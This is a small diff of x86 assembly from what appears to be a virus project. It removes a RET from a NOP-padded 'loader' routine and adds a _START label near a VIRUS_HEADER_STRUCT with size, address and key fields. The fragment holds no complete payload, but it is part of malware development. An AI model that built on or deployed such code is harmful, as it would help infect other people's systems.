@@ -466,7 +466,6 @@ loader:
 	NOP
 	NOP
 	NOP
-		RET
 
 _GET_HEADER_VIRUSE:
 	LEA EAX, [REL VIRUS_HEADER_STRUCT]
@@ -477,4 +476,5 @@ VIRUS_HEADER_STRUCT:
 	db 0x00, 0x00, 0x00, 0x00,                                                                        ;; -- SIZE -- ;;
 	db 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF 		                                  ;; -- ADDRESS -- ;;
 	db 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 ;; -- KEY -- ;;
-	
+
+_START:	
